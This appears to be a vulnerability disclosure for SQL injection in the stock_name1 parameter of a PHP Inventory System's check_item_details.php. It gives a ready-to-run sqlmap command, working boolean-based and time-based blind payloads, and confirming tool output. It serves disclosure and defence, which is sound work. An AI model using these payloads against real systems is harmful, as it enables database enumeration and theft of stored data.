# SQL Injection in Inventory System (Check Item Details)

## Overview

* **Vulnerability Type**: SQL Injection (Boolean-based Blind / Time-based Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Check Item Details (`check_item_details.php`)
* **Vulnerable Parameter**: `stock_name1` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `check_item_details.php` file.

The application fails to properly sanitize the `stock_name1` parameter in the HTTP POST request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL**, attackers can exploit this using Boolean-based or Time-based blind injection techniques (e.g., using `SLEEP()`) to enumerate database structures and exfiltrate sensitive data.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP POST request to `check_item_details.php` with the malicious payload, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/check_item_details.php" \
--data "stock_name1=" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
stock_name1=' OR NOT 4616=4616#

```

**Time-based Blind Payload:**

```sql
stock_name1=' AND (SELECT 2208 FROM (SELECT(SLEEP(5)))zsph)-- KQvW

```

## Proof of Concept

The following output from `sqlmap` confirms that the `stock_name1` parameter is vulnerable to Boolean-based and Time-based SQL injection.

```text
Parameter: stock_name1 (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: stock_name1=' OR NOT 4616=4616#
    Vector: OR NOT [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: stock_name1=' AND (SELECT 2208 FROM (SELECT(SLEEP(5)))zsph)-- KQvW
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL

```
<img width="884" height="266" alt="图片" src="https://github.com/user-attachments/assets/3cccdd44-b996-447e-95b9-7e32b7edf3f2" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the MySQL database.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
